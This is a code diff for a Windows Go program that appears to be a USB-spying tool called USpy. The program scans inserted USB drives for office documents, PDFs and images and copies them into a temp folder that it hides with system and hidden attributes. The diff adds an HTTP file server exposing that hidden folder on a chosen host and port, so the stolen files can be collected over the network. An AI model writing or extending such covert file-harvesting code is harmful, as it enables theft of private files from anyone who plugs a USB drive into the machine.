@@ -2,7 +2,9 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"io"
+	"net/http"
 	"os"
 	"os/exec"
 	"sort"
@@ -13,6 +15,14 @@ import (
 	"github.com/shirou/gopsutil/v4/disk"
 	"golang.org/x/sys/windows"
 )
+
+func runServer(host string, port int, temp_path string) {
+	server := http.FileServer(http.Dir(temp_path))
+
+	http.Handle("/", server)
+
+	http.ListenAndServe(fmt.Sprintf("%s:%d", host, port), nil)
+}
 
 func getDriveLabel(drive string) string {
 	_volume_name := make([]uint16, windows.MAX_PATH+1)
@@ -135,10 +145,14 @@ func copyToTemp(files []string, temp_path string) {
 }
 
 func main() {
+	var host string
+	var port int
 	var _scan_rules string
 	var scan_level int
 	var admin_name string
 	var temp_path string
+	flag.StringVar(&host, "host", "127.0.0.1", "HTTP Server host")
+	flag.IntVar(&port, "port", 6789, "HTTP Server port")
 	flag.StringVar(&_scan_rules, "scan-rules", "ppt,pptx,xls,xlsx,doc,docx,pdf,txt,jpg,jpeg,png,bmp,gif", "Scan rules")
 	flag.IntVar(&scan_level, "scan-level", 20, "Scan level")
 	flag.StringVar(&admin_name, "admin-name", "Admin_USpy", "Admin USB volume name")
@@ -148,6 +162,8 @@ func main() {
 
 	os.MkdirAll(temp_path, os.ModePerm)
 	exec.Command("attrib", "+S", "+H", "/D", temp_path[:len(temp_path)-1]).Run()
+
+	go runServer(host, port, temp_path)
 
 	var _usb_drives []string
 	for {
